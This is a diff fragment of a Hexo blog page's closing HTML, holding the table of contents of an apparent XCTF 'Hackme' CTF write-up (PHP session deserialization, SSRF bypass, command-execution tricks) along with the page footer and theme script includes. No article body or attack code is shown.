+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XCTF-Hackme"><span class="nav-number">1.</span> <span class="nav-text">XCTF-Hackme</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#参考题目"><span class="nav-number">1.1.</span> <span class="nav-text">参考题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part1-Session反序列化"><span class="nav-number">1.2.</span> <span class="nav-text">Part1 - Session反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-PHP-Session-序列化及反序列化处理器"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">1) PHP Session 序列化及反序列化处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-配置选项-session-serialize-handler"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">2) 配置选项 session.serialize_handler</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-安全隐患"><span class="nav-number">1.2.0.3.</span> <span class="nav-text">3) 安全隐患</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-回归题目分析"><span class="nav-number">1.2.1.</span> <span class="nav-text">4)回归题目分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part2-SSRF绕法"><span class="nav-number">1.3.</span> <span class="nav-text">Part2 - SSRF绕法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-参考连接"><span class="nav-number">1.3.1.</span> <span class="nav-text">1) 参考连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-回归题目分析"><span class="nav-number">1.3.2.</span> <span class="nav-text">2)回归题目分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux特性"><span class="nav-number">1.4.</span> <span class="nav-text">Linux特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-命令可以通过-符号断续执行"><span class="nav-number">1.4.1.</span> <span class="nav-text">1) 命令可以通过 \ 符号断续执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-通过重定向-gt-符号新建文件"><span class="nav-number">1.4.2.</span> <span class="nav-text">2) 通过重定向 &gt; 符号新建文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-通过命令-sh-执行文件内容"><span class="nav-number">1.4.3.</span> <span class="nav-text">3) 通过命令 sh 执行文件内容</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Part3-命令执行绕法"><span class="nav-number">1.5.</span> <span class="nav-text">Part3 - 命令执行绕法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">1.6.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
